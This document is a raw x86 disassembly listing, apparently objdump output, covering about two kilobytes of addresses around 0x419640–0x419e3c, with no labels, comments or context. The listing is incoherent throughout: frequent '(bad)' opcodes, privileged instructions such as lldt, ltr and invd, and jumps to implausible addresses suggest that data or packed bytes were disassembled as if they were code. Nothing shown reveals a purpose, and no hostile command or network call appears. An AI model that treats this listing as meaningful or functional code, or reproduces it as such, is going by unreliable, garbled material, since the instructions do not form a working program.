  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
